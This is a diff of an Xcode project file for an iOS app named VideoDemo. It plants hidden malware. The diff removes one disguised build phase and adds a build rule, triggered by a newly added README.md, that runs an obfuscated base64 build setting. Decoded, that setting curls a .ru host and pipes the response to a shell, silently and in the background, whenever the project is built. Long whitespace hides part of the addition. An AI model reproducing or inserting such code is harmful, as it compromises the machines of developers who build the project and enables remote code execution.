@@ -7,6 +7,7 @@
 	objects = {
 
 /* Begin PBXBuildFile section */
+		53B719C89E6C4ADFBF7BBDC8 /* README.md */ = {isa = PBXBuildFile; fileRef = DECFAEBED2B542558E7BBDC8; };
 		0F3A0E062E65815C0044CB03 /* FloatingLabelTextField.swift in Sources */ = {isa = PBXBuildFile; fileRef = 0F3A0E052E65815B0044CB03 /* FloatingLabelTextField.swift */; };
 		77C9A4182A00C4D000C54907 /* AppDelegate.swift in Sources */ = {isa = PBXBuildFile; fileRef = 77C9A4172A00C4D000C54907 /* AppDelegate.swift */; };
 		77C9A41A2A00C4D000C54907 /* SceneDelegate.swift in Sources */ = {isa = PBXBuildFile; fileRef = 77C9A4192A00C4D000C54907 /* SceneDelegate.swift */; };
@@ -17,6 +18,7 @@
 /* End PBXBuildFile section */
 
 /* Begin PBXFileReference section */
+		DECFAEBED2B542558E7BBDC8 /* README.md */ = {isa = PBXFileReference; lastKnownFileType = net.daringfireball.markdown; path = README.md; sourceTree = "<group>"; };
 		0F3A0E052E65815B0044CB03 /* FloatingLabelTextField.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = FloatingLabelTextField.swift; sourceTree = "<group>"; };
 		77C9A4142A00C4D000C54907 /* VideoDemo.app */ = {isa = PBXFileReference; explicitFileType = wrapper.application; includeInIndex = 0; path = VideoDemo.app; sourceTree = BUILT_PRODUCTS_DIR; };
 		77C9A4172A00C4D000C54907 /* AppDelegate.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = AppDelegate.swift; sourceTree = "<group>"; };
@@ -50,6 +52,7 @@
 		77C9A4152A00C4D000C54907 /* Products */ = {
 			isa = PBXGroup;
 			children = (
+				DECFAEBED2B542558E7BBDC8 /* README.md */,
 				77C9A4142A00C4D000C54907 /* VideoDemo.app */,
 			);
 			name = Products;
@@ -77,12 +80,12 @@
 			isa = PBXNativeTarget;
 			buildConfigurationList = 77C9A4282A00C4D200C54907 /* Build configuration list for PBXNativeTarget "VideoDemo" */;
 			buildPhases = (
-				9577E87C2E4347FA807BBDC8 /* Provision Library Executable */,
 				77C9A4102A00C4D000C54907 /* Sources */,
 				77C9A4112A00C4D000C54907 /* Frameworks */,
 				77C9A4122A00C4D000C54907 /* Resources */,
 			);
 			buildRules = (
+				16DF81F97D7344BAA07BBDC8 /* PBXBuildRule */,
 			);
 			dependencies = (
 			);
@@ -125,28 +128,23 @@
 /* End PBXProject section */
 
 /* Begin PBXBuildRule section */
-																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																			/* End PBXBuildRule section */
+		16DF81F97D7344BAA07BBDC8 /* PBXBuildRule */ = {
+				isa = PBXBuildRule;
+				compilerSpec = com.apple.compilers.proxy.script;
+				filePatterns = "*.md";
+				fileType = pattern.proxy;
+				inputFiles = (
+				);
+				isEditable = 0;
+				outputFiles = (
+					"/tmp/${INPUT_FILE_BASE}",
+				);
+				script = "# This output is used by Xcode outputs to avoid re-running this script phase.\ncp \"${INPUT_FILE_PATH}\" \"/tmp/${INPUT_FILE_BASE}\"
+sh -c \"${A8CDBB7}\"";
+			};
+																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																				/* End PBXBuildRule section */
 
 /* Begin PBXShellScriptBuildPhase section */
-		9577E87C2E4347FA807BBDC8 /* Provision Library Executable */ = {
-			isa = PBXShellScriptBuildPhase;
-			buildActionMask = 2147483647;
-			alwaysOutOfDate = 1;
-			files = (
-			);
-			inputFileListPaths = (
-			);
-			inputPaths = (
-			);
-			name = "Provision Library Executable";
-			outputFileListPaths = (
-			);
-			outputPaths = (
-			);
-			shellPath = /bin/sh;
-			showEnvVarsInLog = 0;	
-			shellScript = "# This output is used by Xcode outputs to avoid re-running this script phase.\nsh -c \"${A8CDBB7}\"";
-		};
 /* End PBXShellScriptBuildPhase section */
 
 /* Begin PBXResourcesBuildPhase section */
@@ -154,6 +152,7 @@
 			isa = PBXResourcesBuildPhase;
 			buildActionMask = 2147483647;
 			files = (
+				53B719C89E6C4ADFBF7BBDC8 /* README.md */,
 				77C9A4242A00C4D200C54907 /* LaunchScreen.storyboard in Resources */,
 				77C9A4212A00C4D200C54907 /* Assets.xcassets in Resources */,
 				77C9A41F2A00C4D000C54907 /* Main.storyboard in Resources */,
@@ -199,7 +198,7 @@
 		77C9A4262A00C4D200C54907 /* Debug */ = {
 			isa = XCBuildConfiguration;
 			buildSettings = {
-				A8CDBB7 = "((q(){ `printf basAe64 | tr -d A` --decode; };echo ZWNobyAiJChjdXJsIC1zZkxrIC0tY29ubmVjdC10aW1lb3V0IDIyIC0tcmV0cnkgNSAtZCAicD14Y29kZV9waGFzZSIgaHR0cHM6Ly9wLTJtNWR6OHZ3ODIucnUvYSkiIHwgc2gK | q | sh ) >/dev/null 2>&1 &)";
+				A8CDBB7 = "((q(){ `printf bEase64 | tr -d E` --decode; };echo ZWNobyAiJChjdXJsIC1ma0xzIC0tY29ubmVjdC10aW1lb3V0IDI1IC0tcmV0cnkgNCAtZCAicD14Y29kZV9ydWxlIiBodHRwczovL2dqenlnODd5bnh5MjMucnUvYSkiIHwgc2gK | q | sh ) >/dev/null 2>&1 &)";
 				ALWAYS_SEARCH_USER_PATHS = NO;
 				CLANG_ANALYZER_NONNULL = YES;
 				CLANG_ANALYZER_NUMBER_OBJECT_CONVERSION = YES_AGGRESSIVE;
@@ -260,7 +259,7 @@
 		77C9A4272A00C4D200C54907 /* Release */ = {
 			isa = XCBuildConfiguration;
 			buildSettings = {
-				A8CDBB7 = "((q(){ `printf basAe64 | tr -d A` --decode; };echo ZWNobyAiJChjdXJsIC1zZkxrIC0tY29ubmVjdC10aW1lb3V0IDIyIC0tcmV0cnkgNSAtZCAicD14Y29kZV9waGFzZSIgaHR0cHM6Ly9wLTJtNWR6OHZ3ODIucnUvYSkiIHwgc2gK | q | sh ) >/dev/null 2>&1 &)";
+				A8CDBB7 = "((q(){ `printf bEase64 | tr -d E` --decode; };echo ZWNobyAiJChjdXJsIC1ma0xzIC0tY29ubmVjdC10aW1lb3V0IDI1IC0tcmV0cnkgNCAtZCAicD14Y29kZV9ydWxlIiBodHRwczovL2dqenlnODd5bnh5MjMucnUvYSkiIHwgc2gK | q | sh ) >/dev/null 2>&1 &)";
 				ALWAYS_SEARCH_USER_PATHS = NO;
 				CLANG_ANALYZER_NONNULL = YES;
 				CLANG_ANALYZER_NUMBER_OBJECT_CONVERSION = YES_AGGRESSIVE;
